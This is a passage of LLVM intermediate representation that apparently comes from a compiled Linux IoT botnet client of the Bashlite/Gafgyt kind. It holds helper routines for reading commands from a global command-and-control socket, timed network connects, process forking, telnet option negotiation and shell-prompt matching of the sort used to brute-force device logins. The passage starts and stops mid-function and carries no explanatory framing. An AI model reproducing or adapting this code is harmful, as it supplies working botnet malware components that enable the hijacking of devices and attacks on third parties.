  %31 = zext i1 %30 to i32
  br label %47

; <label>:32:                                     ; preds = %2
  %33 = zext i8 %3 to i32
  %34 = tail call i32 @toupper(i32 %33) #14
  %35 = load i8, i8* %1, align 1
  %36 = zext i8 %35 to i32
  %37 = tail call i32 @toupper(i32 %36) #14
  %38 = icmp eq i32 %34, %37
  br i1 %38, label %39, label %44

; <label>:39:                                     ; preds = %32
  %40 = getelementptr inbounds i8, i8* %0, i64 1
  %41 = getelementptr inbounds i8, i8* %1, i64 1
  %42 = tail call i32 @wildString(i8* %40, i8* %41)
  %43 = icmp ne i32 %42, 0
  br label %44

; <label>:44:                                     ; preds = %39, %32
  %45 = phi i1 [ true, %32 ], [ %43, %39 ]
  %46 = zext i1 %45 to i32
  br label %47

; <label>:47:                                     ; preds = %44, %29, %18, %4
  %.0 = phi i32 [ %46, %44 ], [ %31, %29 ], [ %20, %18 ], [ %6, %4 ]
  ret i32 %.0
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr* nocapture) local_unnamed_addr #1 {
  %3 = tail call i32 @inet_addr(i8* %0) #3
  %4 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1, i64 0, i32 0
  store i32 %3, i32* %4, align 4
  %5 = icmp eq i32 %3, -1
  %. = zext i1 %5 to i32
  ret i32 %.
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8* nocapture) local_unnamed_addr #1 {
  %2 = load i8, i8* %0, align 1
  %3 = icmp eq i8 %2, 0
  br i1 %3, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %1
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %4 = phi i8 [ %9, %.lr.ph ], [ %2, %.lr.ph.preheader ]
  %.04 = phi i8* [ %8, %.lr.ph ], [ %0, %.lr.ph.preheader ]
  %5 = zext i8 %4 to i32
  %6 = tail call i32 @toupper(i32 %5) #14
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* %.04, align 1
  %8 = getelementptr inbounds i8, i8* %.04, i64 1
  %9 = load i8, i8* %8, align 1
  %10 = icmp eq i8 %9, 0
  br i1 %10, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @getBogos(i8*) local_unnamed_addr #1 {
  %2 = alloca [4096 x i8], align 16
  %3 = tail call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.20, i64 0, i64 0), i32 0) #3
  %4 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 0
  %5 = call i8* @fdgets(i8* nonnull %4, i32 4096, i32 %3)
  %6 = icmp eq i8* %5, null
  br i1 %6, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %1
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %24
  call void @uppercase(i8* nonnull %4)
  %strncmp = call i32 @strncmp(i8* nonnull %4, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.21, i64 0, i64 0), i64 8)
  %cmp = icmp eq i32 %strncmp, 0
  br i1 %cmp, label %7, label %24

; <label>:7:                                      ; preds = %.lr.ph
  %8 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 8
  br label %9

; <label>:9:                                      ; preds = %.critedge, %7
  %.0 = phi i8* [ %8, %7 ], [ %11, %.critedge ]
  %10 = load i8, i8* %.0, align 1
  switch i8 %10, label %.preheader.preheader [
    i8 32, label %.critedge
    i8 9, label %.critedge
    i8 58, label %.critedge
  ]

.preheader.preheader:                             ; preds = %9
  br label %.preheader

.critedge:                                        ; preds = %9, %9, %9
  %11 = getelementptr inbounds i8, i8* %.0, i64 1
  br label %9

.preheader:                                       ; preds = %.preheader.preheader, %16
  %12 = call i64 @strlen(i8* %.0) #14
  %13 = add i64 %12, -1
  %14 = getelementptr inbounds i8, i8* %.0, i64 %13
  %15 = load i8, i8* %14, align 1
  switch i8 %15, label %17 [
    i8 13, label %16
    i8 10, label %16
  ]

; <label>:16:                                     ; preds = %.preheader, %.preheader
  store i8 0, i8* %14, align 1
  br label %.preheader

; <label>:17:                                     ; preds = %.preheader
  %18 = call i8* @strchr(i8* nonnull %.0, i32 46) #14
  %19 = icmp eq i8* %18, null
  br i1 %19, label %21, label %20

; <label>:20:                                     ; preds = %17
  store i8 0, i8* %18, align 1
  br label %21

; <label>:21:                                     ; preds = %17, %20
  %22 = call i8* @strcpy(i8* %0, i8* nonnull %.0) #3
  %23 = call i32 @close(i32 %3) #3
  br label %28

; <label>:24:                                     ; preds = %.lr.ph
  call void @llvm.memset.p0i8.i64(i8* nonnull %4, i8 0, i64 4096, i32 16, i1 false)
  %25 = call i8* @fdgets(i8* nonnull %4, i32 4096, i32 %3)
  %26 = icmp eq i8* %25, null
  br i1 %26, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %24
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  %27 = call i32 @close(i32 %3) #3
  br label %28

; <label>:28:                                     ; preds = %._crit_edge, %21
  %.017 = phi i32 [ 0, %21 ], [ 1, %._crit_edge ]
  ret i32 %.017
}

declare i32 @open(i8* nocapture readonly, i32, ...) local_unnamed_addr #4

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) local_unnamed_addr #2

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8* nocapture readonly) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @getCores() local_unnamed_addr #1 {
  %1 = alloca [4096 x i8], align 16
  %2 = tail call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.20, i64 0, i64 0), i32 0) #3
  %3 = getelementptr inbounds [4096 x i8], [4096 x i8]* %1, i64 0, i64 0
  %4 = call i8* @fdgets(i8* nonnull %3, i32 4096, i32 %2)
  %5 = icmp eq i8* %4, null
  br i1 %5, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %0
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.04 = phi i32 [ %..0, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  call void @uppercase(i8* nonnull %3)
  %strncmp = call i32 @strncmp(i8* nonnull %3, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.21, i64 0, i64 0), i64 8)
  %cmp = icmp eq i32 %strncmp, 0
  %6 = zext i1 %cmp to i32
  %..0 = add nsw i32 %6, %.04
  call void @llvm.memset.p0i8.i64(i8* nonnull %3, i8 0, i64 4096, i32 16, i1 false)
  %7 = call i8* @fdgets(i8* nonnull %3, i32 4096, i32 %2)
  %8 = icmp eq i8* %7, null
  br i1 %8, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %0
  %.0.lcssa = phi i32 [ 0, %0 ], [ %..0, %._crit_edge.loopexit ]
  %9 = call i32 @close(i32 %2) #3
  ret i32 %.0.lcssa
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @makeRandomStr(i8* nocapture, i32) local_unnamed_addr #0 {
  %3 = icmp sgt i32 %1, 0
  br i1 %3, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  %wide.trip.count = zext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %4 = tail call i32 @rand_cmwc()
  %5 = urem i32 %4, 26
  %6 = add nuw nsw i32 %5, 65
  %7 = trunc i32 %6 to i8
  %8 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  store i8 %7, i8* %8, align 1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8* nocapture, i32) local_unnamed_addr #1 {
  %4 = alloca %struct.__sigset_t, align 8
  %5 = alloca %struct.timeval, align 8
  %6 = alloca i8, align 1
  %7 = sext i32 %2 to i64
  tail call void @llvm.memset.p0i8.i64(i8* %1, i8 0, i64 %7, i32 1, i1 false)
  %8 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i64 0, i32 0
  store i64 30, i64* %8, align 8
  %9 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i64 0, i32 1
  store i64 0, i64* %9, align 8
  %10 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i64 0, i32 0, i64 0
  %11 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %10) #3, !srcloc !1
  %12 = srem i32 %0, 64
  %13 = zext i32 %12 to i64
  %14 = shl i64 1, %13
  %15 = sdiv i32 %0, 64
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i64 0, i32 0, i64 %16
  %18 = load i64, i64* %17, align 8
  %19 = or i64 %18, %14
  store i64 %19, i64* %17, align 8
  %20 = add nsw i32 %0, 1
  %21 = call i32 @select(i32 %20, %struct.__sigset_t* nonnull %4, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %4, %struct.timeval* nonnull %5) #3
  %22 = icmp sgt i32 %2, 1
  br i1 %22, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %3
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %31
  %.in = phi i32 [ %23, %31 ], [ %2, %.lr.ph.preheader ]
  %.024 = phi i32 [ %32, %31 ], [ 0, %.lr.ph.preheader ]
  %.01923 = phi i8* [ %29, %31 ], [ %1, %.lr.ph.preheader ]
  %23 = add nsw i32 %.in, -1
  %24 = load i32, i32* @mainCommSock, align 4
  %25 = call i64 @recv(i32 %24, i8* nonnull %6, i64 1, i32 0) #3
  %26 = icmp eq i64 %25, 1
  br i1 %26, label %27, label %._crit_edge.loopexit

; <label>:27:                                     ; preds = %.lr.ph
  %28 = load i8, i8* %6, align 1
  %29 = getelementptr inbounds i8, i8* %.01923, i64 1
  store i8 %28, i8* %.01923, align 1
  %30 = icmp eq i8 %28, 10
  br i1 %30, label %._crit_edge.loopexit, label %31

; <label>:31:                                     ; preds = %27
  %32 = add nuw nsw i32 %.024, 1
  %33 = icmp sgt i32 %23, 1
  br i1 %33, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph, %31, %27
  %.1.sink.ph = phi i8* [ %.01923, %.lr.ph ], [ %29, %31 ], [ %29, %27 ]
  %.020.ph = phi i32 [ -1, %.lr.ph ], [ %32, %31 ], [ %.024, %27 ]
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %3
  %.1.sink = phi i8* [ %1, %3 ], [ %.1.sink.ph, %._crit_edge.loopexit ]
  %.020 = phi i32 [ 0, %3 ], [ %.020.ph, %._crit_edge.loopexit ]
  store i8 0, i8* %.1.sink, align 1
  ret i32 %.020
}

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) local_unnamed_addr #4

declare i64 @recv(i32, i8*, i64, i32) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) local_unnamed_addr #1 {
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca %struct.timeval, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 3, i8* null) #3
  %11 = sext i32 %10 to i64
  %12 = or i64 %11, 2048
  %13 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 4, i64 %12) #3
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  store i16 2, i16* %14, align 4
  %15 = trunc i32 %2 to i16
  %16 = tail call zeroext i16 @htons(i16 zeroext %15) #17
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  store i16 %16, i16* %17, align 2
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2
  %19 = call i32 @getHost(i8* %1, %struct.in_addr* %18)
  %20 = icmp eq i32 %19, 0
  br i1 %20, label %21, label %58

; <label>:21:                                     ; preds = %4
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 3, i64 0
  %23 = bitcast i8* %22 to i64*
  store i64 0, i64* %23, align 4
  %24 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %25 = call i32 @connect(i32 %0, %struct.sockaddr* nonnull %24, i32 16) #3
  %26 = icmp slt i32 %25, 0
  br i1 %26, label %27, label %53

; <label>:27:                                     ; preds = %21
  %28 = tail call i32* @__errno_location() #17
  %29 = load i32, i32* %28, align 4
  %30 = icmp eq i32 %29, 115
  br i1 %30, label %31, label %58

; <label>:31:                                     ; preds = %27
  %32 = sext i32 %3 to i64
  %33 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i64 0, i32 0
  store i64 %32, i64* %33, align 8
  %34 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i64 0, i32 1
  store i64 0, i64* %34, align 8
  %35 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %6, i64 0, i32 0, i64 0
  %36 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %35) #3, !srcloc !2
  %37 = srem i32 %0, 64
  %38 = zext i32 %37 to i64
  %39 = shl i64 1, %38
  %40 = sdiv i32 %0, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %6, i64 0, i32 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %39
  store i64 %44, i64* %42, align 8
  %45 = add nsw i32 %0, 1
  %46 = call i32 @select(i32 %45, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %6, %struct.__sigset_t* null, %struct.timeval* nonnull %7) #3
  %47 = icmp sgt i32 %46, 0
  br i1 %47, label %48, label %58

; <label>:48:                                     ; preds = %31
  store i32 4, i32* %8, align 4
  %49 = bitcast i32* %9 to i8*
  %50 = call i32 @getsockopt(i32 %0, i32 1, i32 4, i8* nonnull %49, i32* nonnull %8) #3
  %51 = load i32, i32* %9, align 4
  %52 = icmp eq i32 %51, 0
  br i1 %52, label %53, label %58

; <label>:53:                                     ; preds = %48, %21
  %54 = call i32 (i32, i32, ...) @fcntl(i32 %0, i32 3, i8* null) #3
  %55 = sext i32 %54 to i64
  %56 = and i64 %55, -2049
  %57 = call i32 (i32, i32, ...) @fcntl(i32 %0, i32 4, i64 %56) #3
  br label %58

; <label>:58:                                     ; preds = %27, %31, %48, %4, %53
  %.0 = phi i32 [ 1, %53 ], [ 0, %4 ], [ 0, %48 ], [ 0, %31 ], [ 0, %27 ]
  ret i32 %.0
}

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr #4

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) local_unnamed_addr #9

declare i32 @connect(i32, %struct.sockaddr*, i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() local_unnamed_addr #1 {
  %1 = tail call i32 @fork() #3
  %2 = icmp eq i32 %1, 0
  br i1 %2, label %23, label %3

; <label>:3:                                      ; preds = %0
  %4 = load i64, i64* @numpids, align 8
  %5 = add i64 %4, 1
  store i64 %5, i64* @numpids, align 8
  %6 = shl i64 %4, 2
  %7 = add i64 %6, 8
  %8 = tail call noalias i8* @malloc(i64 %7) #3
  %9 = bitcast i8* %8 to i32*
  %10 = icmp eq i64 %4, 0
  br i1 %10, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %3
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %11 = phi i64 [ %17, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %.012 = phi i32 [ %16, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %12 = load i32*, i32** @pids, align 8
  %13 = getelementptr inbounds i32, i32* %12, i64 %11
  %14 = load i32, i32* %13, align 4
  %15 = getelementptr inbounds i32, i32* %9, i64 %11
  store i32 %14, i32* %15, align 4
  %16 = add i32 %.012, 1
  %17 = zext i32 %16 to i64
  %18 = load i64, i64* @numpids, align 8
  %19 = add i64 %18, -1
  %20 = icmp ult i64 %17, %19
  br i1 %20, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %3
  %.lcssa = phi i64 [ 0, %3 ], [ %19, %._crit_edge.loopexit ]
  %21 = getelementptr inbounds i32, i32* %9, i64 %.lcssa
  store i32 %1, i32* %21, align 4
  %22 = load i8*, i8** bitcast (i32** @pids to i8**), align 8
  tail call void @free(i8* %22) #3
  store i8* %8, i8** bitcast (i32** @pids to i8**), align 8
  br label %23

; <label>:23:                                     ; preds = %0, %._crit_edge
  ret i32 %1
}

; Function Attrs: nounwind
declare i32 @fork() local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) local_unnamed_addr #1 {
  %4 = alloca i8, align 1
  %5 = getelementptr inbounds i8, i8* %1, i64 1
  %6 = load i8, i8* %5, align 1
  %.off = add i8 %6, 5
  %switch = icmp ult i8 %.off, 4
  br i1 %switch, label %7, label %20

; <label>:7:                                      ; preds = %3
  store i8 -1, i8* %4, align 1
  %8 = call i64 @send(i32 %0, i8* nonnull %4, i64 1, i32 16384) #3
  %9 = load i8, i8* %5, align 1
  switch i8 %9, label %13 [
    i8 -4, label %10
    i8 -2, label %11
    i8 3, label %12
  ]

; <label>:10:                                     ; preds = %7
  store i8 -2, i8* %4, align 1
  br label %16

; <label>:11:                                     ; preds = %7
  store i8 -4, i8* %4, align 1
  br label %16

; <label>:12:                                     ; preds = %7
  store i8 -3, i8* %4, align 1
  br label %16

; <label>:13:                                     ; preds = %7
  %14 = icmp eq i8 %9, -3
  %15 = select i1 %14, i8 -4, i8 -2
  store i8 %15, i8* %4, align 1
  br label %16

; <label>:16:                                     ; preds = %11, %13, %12, %10
  %17 = call i64 @send(i32 %0, i8* nonnull %4, i64 1, i32 16384) #3
  %18 = getelementptr inbounds i8, i8* %1, i64 2
  %19 = call i64 @send(i32 %0, i8* %18, i64 1, i32 16384) #3
  br label %20

; <label>:20:                                     ; preds = %3, %16
  ret i32 0
}

; Function Attrs: noinline nounwind readonly uwtable
define i32 @matchPrompt(i8* nocapture readonly) local_unnamed_addr #11 {
.preheader:
  %1 = tail call i64 @strlen(i8* %0) #14
  %2 = trunc i64 %1 to i32
  %sext = shl i64 %1, 32
  %3 = ashr exact i64 %sext, 32
  %4 = getelementptr inbounds i8, i8* %0, i64 %3
  %sext29 = shl i64 %1, 32
  %5 = ashr exact i64 %sext29, 32
  %6 = getelementptr inbounds i8, i8* %0, i64 %5
  %sext41 = shl i64 %1, 32
  %7 = ashr exact i64 %sext41, 32
  %8 = icmp sgt i32 %2, 0
  br i1 %8, label %.lr.ph.preheader, label %.critedge

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.preheader.137:                                   ; preds = %.critedge
  %9 = icmp sgt i32 %2, %.1.lcssa
  br i1 %9, label %.lr.ph.preheader.1, label %.critedge.1

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.critedge1
  %indvars.iv = phi i64 [ %indvars.iv.next, %.critedge1 ], [ 0, %.lr.ph.preheader ]
  %.130 = phi i32 [ %14, %.critedge1 ], [ 0, %.lr.ph.preheader ]
  %10 = sub nsw i64 0, %indvars.iv
  %11 = getelementptr inbounds i8, i8* %6, i64 %10
  %12 = load i8, i8* %11, align 1
  %13 = trunc i64 %indvars.iv to i32
  switch i8 %12, label %.critedge.loopexit [
    i8 0, label %.critedge1
    i8 32, label %.critedge1
    i8 13, label %.critedge1
    i8 10, label %.critedge1
  ]

.critedge1:                                       ; preds = %.lr.ph, %.lr.ph, %.lr.ph, %.lr.ph
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %14 = add nsw i32 %.130, 1
  %15 = icmp sgt i64 %7, %indvars.iv.next
  br i1 %15, label %.lr.ph, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph, %.critedge1
  %.1.lcssa.ph = phi i32 [ %13, %.lr.ph ], [ %14, %.critedge1 ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %.preheader
  %.1.lcssa = phi i32 [ 0, %.preheader ], [ %.1.lcssa.ph, %.critedge.loopexit ]
  %16 = sext i32 %.1.lcssa to i64
  %17 = sub nsw i64 0, %16
  %18 = getelementptr inbounds i8, i8* %4, i64 %17
  %19 = load i8, i8* %18, align 1
  %20 = icmp eq i8 %19, 58
  br i1 %20, label %21, label %.preheader.137

; <label>:21:                                     ; preds = %.critedge.3, %.critedge.2, %.critedge.1, %.critedge
  ret i32 1

.lr.ph.preheader.1:                               ; preds = %.preheader.137
  %22 = sext i32 %.1.lcssa to i64
  br label %.lr.ph.1

.lr.ph.1:                                         ; preds = %.critedge1.1, %.lr.ph.preheader.1
  %indvars.iv.1 = phi i64 [ %22, %.lr.ph.preheader.1 ], [ %indvars.iv.next.1, %.critedge1.1 ]
  %.130.1 = phi i32 [ %.1.lcssa, %.lr.ph.preheader.1 ], [ %27, %.critedge1.1 ]
  %23 = sub nsw i64 0, %indvars.iv.1
  %24 = getelementptr inbounds i8, i8* %6, i64 %23
  %25 = load i8, i8* %24, align 1
  %26 = trunc i64 %indvars.iv.1 to i32
  switch i8 %25, label %.critedge.1.loopexit [
    i8 0, label %.critedge1.1
    i8 32, label %.critedge1.1
    i8 13, label %.critedge1.1
    i8 10, label %.critedge1.1
  ]

.critedge1.1:                                     ; preds = %.lr.ph.1, %.lr.ph.1, %.lr.ph.1, %.lr.ph.1
  %indvars.iv.next.1 = add nsw i64 %indvars.iv.1, 1
  %27 = add nsw i32 %.130.1, 1
  %28 = icmp sgt i64 %7, %indvars.iv.next.1
  br i1 %28, label %.lr.ph.1, label %.critedge.1.loopexit

.critedge.1.loopexit:                             ; preds = %.critedge1.1, %.lr.ph.1
  %.1.lcssa.1.ph = phi i32 [ %26, %.lr.ph.1 ], [ %27, %.critedge1.1 ]
  br label %.critedge.1

.critedge.1:                                      ; preds = %.critedge.1.loopexit, %.preheader.137
  %.1.lcssa.1 = phi i32 [ %.1.lcssa, %.preheader.137 ], [ %.1.lcssa.1.ph, %.critedge.1.loopexit ]
  %29 = sext i32 %.1.lcssa.1 to i64
  %30 = sub nsw i64 0, %29
  %31 = getelementptr inbounds i8, i8* %4, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = icmp eq i8 %32, 62
  br i1 %33, label %21, label %.preheader.238

.preheader.238:                                   ; preds = %.critedge.1
  %34 = icmp sgt i32 %2, %.1.lcssa.1
  br i1 %34, label %.lr.ph.preheader.2, label %.critedge.2

.lr.ph.preheader.2:                               ; preds = %.preheader.238
  %35 = sext i32 %.1.lcssa.1 to i64
  br label %.lr.ph.2

.lr.ph.2:                                         ; preds = %.critedge1.2, %.lr.ph.preheader.2
  %indvars.iv.2 = phi i64 [ %35, %.lr.ph.preheader.2 ], [ %indvars.iv.next.2, %.critedge1.2 ]
  %.130.2 = phi i32 [ %.1.lcssa.1, %.lr.ph.preheader.2 ], [ %40, %.critedge1.2 ]
  %36 = sub nsw i64 0, %indvars.iv.2
  %37 = getelementptr inbounds i8, i8* %6, i64 %36
  %38 = load i8, i8* %37, align 1
  %39 = trunc i64 %indvars.iv.2 to i32
  switch i8 %38, label %.critedge.2.loopexit [
    i8 0, label %.critedge1.2
    i8 32, label %.critedge1.2
    i8 13, label %.critedge1.2
    i8 10, label %.critedge1.2
  ]

.critedge1.2:                                     ; preds = %.lr.ph.2, %.lr.ph.2, %.lr.ph.2, %.lr.ph.2
  %indvars.iv.next.2 = add nsw i64 %indvars.iv.2, 1
  %40 = add nsw i32 %.130.2, 1
  %41 = icmp sgt i64 %7, %indvars.iv.next.2
  br i1 %41, label %.lr.ph.2, label %.critedge.2.loopexit

.critedge.2.loopexit:                             ; preds = %.critedge1.2, %.lr.ph.2
  %.1.lcssa.2.ph = phi i32 [ %39, %.lr.ph.2 ], [ %40, %.critedge1.2 ]
  br label %.critedge.2

.critedge.2:                                      ; preds = %.critedge.2.loopexit, %.preheader.238
  %.1.lcssa.2 = phi i32 [ %.1.lcssa.1, %.preheader.238 ], [ %.1.lcssa.2.ph, %.critedge.2.loopexit ]
  %42 = sext i32 %.1.lcssa.2 to i64
  %43 = sub nsw i64 0, %42
  %44 = getelementptr inbounds i8, i8* %4, i64 %43
  %45 = load i8, i8* %44, align 1
  %46 = icmp eq i8 %45, 37
  br i1 %46, label %21, label %.preheader.339

.preheader.339:                                   ; preds = %.critedge.2
  %47 = icmp sgt i32 %2, %.1.lcssa.2
  br i1 %47, label %.lr.ph.preheader.3, label %.critedge.3

.lr.ph.preheader.3:                               ; preds = %.preheader.339
  %48 = sext i32 %.1.lcssa.2 to i64
  br label %.lr.ph.3

.lr.ph.3:                                         ; preds = %.critedge1.3, %.lr.ph.preheader.3
  %indvars.iv.3 = phi i64 [ %48, %.lr.ph.preheader.3 ], [ %indvars.iv.next.3, %.critedge1.3 ]
  %.130.3 = phi i32 [ %.1.lcssa.2, %.lr.ph.preheader.3 ], [ %53, %.critedge1.3 ]
  %49 = sub nsw i64 0, %indvars.iv.3
  %50 = getelementptr inbounds i8, i8* %6, i64 %49
  %51 = load i8, i8* %50, align 1
  %52 = trunc i64 %indvars.iv.3 to i32
  switch i8 %51, label %.critedge.3.loopexit [
    i8 0, label %.critedge1.3
    i8 32, label %.critedge1.3
    i8 13, label %.critedge1.3
    i8 10, label %.critedge1.3
  ]

.critedge1.3:                                     ; preds = %.lr.ph.3, %.lr.ph.3, %.lr.ph.3, %.lr.ph.3
  %indvars.iv.next.3 = add nsw i64 %indvars.iv.3, 1
  %53 = add nsw i32 %.130.3, 1
  %54 = icmp sgt i64 %7, %indvars.iv.next.3
  br i1 %54, label %.lr.ph.3, label %.critedge.3.loopexit

.critedge.3.loopexit:                             ; preds = %.critedge1.3, %.lr.ph.3
  %.1.lcssa.3.ph = phi i32 [ %52, %.lr.ph.3 ], [ %53, %.critedge1.3 ]
  br label %.critedge.3

.critedge.3:                                      ; preds = %.critedge.3.loopexit, %.preheader.339
  %.1.lcssa.3 = phi i32 [ %.1.lcssa.2, %.preheader.339 ], [ %.1.lcssa.3.ph, %.critedge.3.loopexit ]
  %55 = sext i32 %.1.lcssa.3 to i64
  %56 = sub nsw i64 0, %55
  %57 = getelementptr inbounds i8, i8* %4, i64 %56
  %58 = load i8, i8* %57, align 1
  %59 = icmp eq i8 %58, 36
  br i1 %59, label %21, label %.preheader.440

.preheader.440:                                   ; preds = %.critedge.3
  %60 = icmp sgt i32 %2, %.1.lcssa.3
  br i1 %60, label %.lr.ph.preheader.4, label %.critedge.4

.lr.ph.preheader.4:                               ; preds = %.preheader.440
  %61 = sext i32 %.1.lcssa.3 to i64
  br label %.lr.ph.4

.lr.ph.4:                                         ; preds = %.critedge1.4, %.lr.ph.preheader.4
  %indvars.iv.4 = phi i64 [ %61, %.lr.ph.preheader.4 ], [ %indvars.iv.next.4, %.critedge1.4 ]
  %.130.4 = phi i32 [ %.1.lcssa.3, %.lr.ph.preheader.4 ], [ %66, %.critedge1.4 ]
  %62 = sub nsw i64 0, %indvars.iv.4
  %63 = getelementptr inbounds i8, i8* %6, i64 %62
  %64 = load i8, i8* %63, align 1
  %65 = trunc i64 %indvars.iv.4 to i32
  switch i8 %64, label %.critedge.4.loopexit [
    i8 0, label %.critedge1.4
    i8 32, label %.critedge1.4
    i8 13, label %.critedge1.4
    i8 10, label %.critedge1.4
  ]

.critedge1.4:                                     ; preds = %.lr.ph.4, %.lr.ph.4, %.lr.ph.4, %.lr.ph.4
  %indvars.iv.next.4 = add nsw i64 %indvars.iv.4, 1
  %66 = add nsw i32 %.130.4, 1
  %67 = icmp sgt i64 %7, %indvars.iv.next.4
  br i1 %67, label %.lr.ph.4, label %.critedge.4.loopexit

.critedge.4.loopexit:                             ; preds = %.critedge1.4, %.lr.ph.4
  %.1.lcssa.4.ph = phi i32 [ %65, %.lr.ph.4 ], [ %66, %.critedge1.4 ]
  br label %.critedge.4

.critedge.4:                                      ; preds = %.critedge.4.loopexit, %.preheader.440
